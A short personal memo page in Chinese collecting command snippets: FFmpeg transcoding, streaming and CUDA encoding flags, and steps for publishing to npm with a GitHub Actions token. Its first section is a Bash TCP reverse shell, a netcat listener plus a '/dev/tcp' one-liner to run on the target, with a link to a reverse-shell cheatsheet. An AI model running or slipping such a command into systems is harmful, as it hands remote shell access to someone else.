---
title: 备忘录
description: 我什么都记不住
---

# 备忘录

## Reverse Shell (Bash TCP) mark

```bash
# 本地开一个 5555 端口监听（extra/gnu-netcat）
nc -lvnp 5555

# 想办法在对面设备上面执行
bash -i >& /dev/tcp/192.168.24.1/5555 0>&1
```

[其他手段](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#reverse-shell)

## FFmpeg

转码

```sh
ffmpeg \
# 输入视频
-i input-1.mp4
# 设置起始时间
-ss 00:01:00
# 设置结束时间
-to 00:02:00
# 设置视频编码格式
-c:v hevc
-c:v copy
# 设置视频码率
-b:v 8M
# 设置音频编码格式
-c:a aac
-c:a copy
# 设置音频码率
-b:a 340k
# 设置输出格式（一般可以自动推断）
-f mp4
# 设置输出文件
output.mp4
```

推流

```sh
ffmpeg \
# 设置推流速度为播放速度
-re
# 输入
-i input-1.mp4
# 设置编码格式
-c copy
# 设置容器格式
-f flv
# 推流地址
rtmp://xxx/xxx
```

### 硬件编解码（需要 cuda）

```sh
ffmpeg \
-hwaccel cuda
-c:v h264_nvenc
-c:v hevc_nvenc
-c:v av1_nvenc
```

## GitHub Action

### 发布 npm publish

1. 首先打开 npmjs.org，申请一个 access token
2. 在 GitHub 上点仓库设置，选择 Environments，创建一个新的 NPM_TOKEN，在里面添加新的 Secret，名称为 NPM_TOKEN，值为上面获取的 access token
3. 复制粘贴这份 [YAML](https://github.com/biliblitz/blitz/blob/master/.github/workflows/build.yml)
